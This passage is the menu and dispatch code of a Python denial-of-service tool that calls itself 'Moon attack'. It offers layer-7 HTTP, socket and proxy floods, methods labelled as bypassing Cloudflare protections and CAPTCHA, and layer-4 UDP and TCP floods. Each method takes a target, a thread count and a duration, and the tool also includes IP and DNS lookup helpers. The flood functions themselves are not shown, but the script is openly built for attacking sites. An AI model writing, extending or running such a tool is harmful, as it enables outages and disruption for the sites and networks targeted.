    stdout.write("             "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"tcp   "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"TCP Attack                                "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

def tools():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX    +" ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"geoip  "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Geo IP Address Lookup                     "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"dns    "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Classic DNS Lookup                        "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ "+Fore.WHITE+"subnet "+Fore.LIGHTRED_EX+" | "+Fore.WHITE+"Subnet IP Address Lookup                  "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

def title():
    stdout.write("                                                                                          \n")
    stdout.write("                                 "+Fore.LIGHTRED_EX  +" ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗\n")
    stdout.write("                                 "+Fore.LIGHTRED_EX  +" ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║\n")
    stdout.write("                                 "+Fore.LIGHTRED_EX  +" ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║\n")
    stdout.write("                                 "+Fore.LIGHTRED_EX  +" ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║\n")
    stdout.write("                                 "+Fore.LIGHTRED_EX  +" ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║\n")
    stdout.write("                                 "+Fore.LIGHTRED_EX  +" ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"        ══╦════════════════════════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTRED_EX+"╔═════════╩══════════════════════════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTRED_EX+"║ "+Fore.LIGHTWHITE_EX   +" Welcome to Moon attack main screen        "+Fore.LIGHTRED_EX  +"                             ║\n")
    stdout.write("             "+Fore.LIGHTRED_EX+"║ "+Fore.LIGHTWHITE_EX   +" Type [help] to see all commands            "+Fore.LIGHTRED_EX +"                             ║\n")
    stdout.write("             "+Fore.LIGHTRED_EX+"║ "+Fore.LIGHTWHITE_EX   +" Contact me? Add m00n_.dull on Discord      "+Fore.LIGHTRED_EX +"                            ║\n")
    stdout.write("             "+Fore.LIGHTRED_EX+"╚══════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

def command():
    stdout.write(Fore.LIGHTRED_EX+"╔═══"+Fore.LIGHTRED_EX+"[""root"+Fore.LIGHTWHITE_EX+"@"+Fore.LIGHTRED_EX+"M00N"+Fore.RED+"]"+Fore.LIGHTRED_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.RED)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        title()
    elif command == "help" or command == "?":
        help()
    elif command == "credit":
        credit()        
    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
        layer7()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "http2" or command == "HTTP2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif command == "pxhttp2" or command == "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "pxcfb" or command == "PXCFB":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif command == "pps" or command == "PPS":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join() 
    elif command == "spoof" or command == "SPOOF":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join() 
    elif command == "pxspoof" or command == "PXSPOOF":
        target, thread, t = get_info_l7()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        time.sleep(1000)
    elif command == "get" or command == "GET":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "post" or command == "POST":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command == "head" or command == "HEAD":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command == "pxraw" or command == "PXRAW":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfreq" or command == "CFREQ":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass CF\n")
    elif command == "cfsoc" or command == "CFSOC":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass CF\n")
    elif command == "pxsky" or command == "PXSKY":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif command == "sky" or command == "SKY":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "subnet":
        stdout.write(Fore.RED+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTRED_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print("Error sending request to API!")
    elif command == "dns":
        stdout.write(Fore.RED+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTRED_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print("Error sending request to API!")
    elif command == "geoip":
        stdout.write(Fore.RED+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTRED_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print("Error sending request to API!")
    else:
        stdout.write(Fore.RED+" [>] "+Fore.WHITE+"Unknown command. Type 'help' to see all commands.\n")

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Cloudflare attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass Cloudflare with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CAPTCHA, BFM, JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CAPTCHA, BFM, JS (socket)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Exit\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Credits\n")

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage: python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "get":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif method == "pxsoc":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass CF\n")
    elif method == "cfsoc":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass CF\n")
    elif method == "http2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    else:
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")